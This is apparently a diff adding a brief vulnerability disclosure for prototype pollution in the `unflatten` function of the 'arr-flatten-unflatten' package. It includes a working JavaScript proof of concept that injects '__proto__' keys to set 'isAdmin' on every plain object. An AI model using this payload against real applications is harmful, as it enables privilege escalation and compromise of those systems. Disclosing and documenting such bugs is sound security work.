@@ -1,0 +1,19 @@
+Confirmed prototype pollution in `unflatten`.
+
+```javascript
+const { unflatten } = require("arr-flatten-unflatten");
+
+// Attacker-controlled flattened object (e.g. from JSON body, query string, etc.)
+const maliciousInput = {
+  "__proto__.polluted": "yes",
+  "__proto__.isAdmin": true
+};
+
+// Victim app calls unflatten() to rebuild a nested object from flat keys
+unflatten(maliciousInput);
+
+// Object.prototype is now polluted, affecting every plain object in the process
+const innocentObject = {};
+console.log("polluted:", innocentObject.polluted);   // "yes"
+console.log("isAdmin:", innocentObject.isAdmin);      // true
+```
